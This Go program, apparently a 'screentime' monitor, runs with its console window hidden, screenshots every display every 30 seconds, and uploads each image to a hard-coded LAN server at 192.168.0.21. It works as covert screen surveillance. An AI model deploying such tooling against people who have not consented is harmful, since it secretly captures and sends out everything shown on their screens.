package main

// go build -ldflags -H=windowsgui -o screentime.exe  main.go

import (
	"bytes"
	"image/jpeg"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"

	screenshot "github.com/kbinani/screenshot"
)

const (
	appName       = "screentime"
	maxRetryCount = 3
)

var (
	consecutiveFailures = 0
)

func captureScreenshot(filename string) {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			log.Fatalf("Error while capturing screenshot: %v", err)
		}
		file, _ := os.Create(filename)
		defer file.Close()
		jpeg.Encode(file, img, &jpeg.Options{Quality: 18})

		log.Printf("#%d : %v \"%s\"\n", i, bounds, filename)
	}
}

func uploadFile(url string, filename string) {
	data, _ := ioutil.ReadFile(filename)

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
	if err != nil {
		log.Printf("Error: %v", err)
		consecutiveFailures++
		return
	}
	req.Header.Set("Content-Type", "multipart/form-data")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("Error: %v", err)
		consecutiveFailures++
		return
	} else {
		consecutiveFailures = 0
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)

	log.Printf("Response: %s", string(body))
}

func deleteOldScreenshots(dir string, threshold time.Time) {
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		log.Printf("Error reading directory: %v", err)
		return
	}

	for _, file := range files {
		if file.ModTime().Before(threshold) {
			filePath := filepath.Join(dir, file.Name())

			err := os.RemoveAll(filePath)
			if err != nil {
				log.Printf("Error deleting file/directory: %v", err)
			} else {
				log.Printf("Deleted old file/directory: %s", filePath)
			}
		}
	}
}


func main() {
	appdata := os.Getenv("APPDATA")
	dir := filepath.Join(appdata, appName)
	os.MkdirAll(dir, os.ModePerm)

	t := time.Now()
	datePath := filepath.Join(dir, t.Format("2006-01-02"))
	os.MkdirAll(datePath, os.ModePerm)

	logFile, err := os.OpenFile(filepath.Join(datePath, "app.log"), os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("error opening log file: %v", err)
	}
	defer logFile.Close()

	multiWriter := io.MultiWriter(os.Stdout, logFile)
	log.SetOutput(multiWriter)

	// Delete screenshots older than one month
	threshold := t.AddDate(0, -1, 0)
	// threshold := t.Add(-1 * time.Minute)
	
	deleteOldScreenshots(dir, threshold)

	for {
		t := time.Now()
		fileName := filepath.Join(datePath, "screenshot_"+t.Format("15-04-05")+".jpg")

		captureScreenshot(fileName)
		if consecutiveFailures < maxRetryCount {
			uploadFile("http://192.168.0.21:5000/upload", fileName)
		} else {
			log.Printf("Reached maximum number of consecutive upload failures. Skipping uploads.")
		}

		time.Sleep(30 * time.Second)
	}
}
